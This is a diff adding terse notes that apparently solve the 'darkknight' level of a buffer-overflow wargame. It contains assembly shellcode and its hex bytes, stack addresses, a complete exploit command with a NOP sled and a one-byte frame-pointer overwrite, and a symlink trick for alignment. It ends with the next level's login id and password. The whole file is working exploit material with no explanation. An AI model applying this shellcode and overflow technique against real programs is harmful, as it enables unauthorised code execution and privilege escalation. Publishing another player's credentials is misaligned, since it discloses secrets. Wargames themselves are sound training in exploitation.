@@ -1,0 +1,33 @@
+<shell.S>
+	section .text
+	.globl _start
+
+	_start:
+        	push $0x40058ae0
+        	mov %esp, %eax
+        	push $0x400fbff9
+        	call *(%eax)
+</shell.S>
+
+<shellcode>
+	\x68\xe0\x8a\x05\x40\x89\xe0\x68\xf9\xbf\x0f\x40\xff\x10
+	length: 14
+</shellcode>
+
+<ebp>
+	ebp: 0xbffffa68
+	next ebp: 0xbffffa34
+</ebp>
+
+<command>
+	./"darkknight$(for x in `seq 1 40`; do printf "a"; done)" "$(printf "aaaa")$(printf "\x3c\xfa\xff\xbf")$(for x in `seq 1 18`; do printf "\x90"; done)$(printf "\x68\xe0\x8a\x05\x40\x89\xe0\x68\xf9\xbf\x0f\x40\xff\x10")$(printf "\x34")"
+</command>
+
+<for align>
+	ln -sf darkknight "darkknight$(for x in `seq 1 40`; do printf "a"; done)"
+</for align>
+
+<next>
+	id: darkknight
+	pw: new attacker
+</next>
